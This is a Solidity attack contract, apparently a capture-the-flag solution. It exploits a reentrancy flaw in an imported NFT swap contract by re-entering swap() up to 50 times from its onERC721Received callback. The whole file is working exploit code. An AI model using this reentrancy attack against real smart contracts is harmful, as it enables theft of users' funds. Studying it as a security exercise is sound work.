pragma solidity ^0.8.0;
import "./nftswap.sol";
contract attck{
    check public che;
    uint256 public times;
    constructor(address _che){
        che = check(_che);
    }

    function depo()public payable{
        che.deposit{value:msg.value}(msg.value);
    }

    function withd()public{
        che.withdraw();
    }

    function sw()public{
        che.weth().approve(address(che),100 ether);
        che.swap();
    }

    function complete()public{
        che.isCompleted();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        if (times<50){
            times+=1;
            che.swap();
        }



        return this.onERC721Received.selector;
    }
}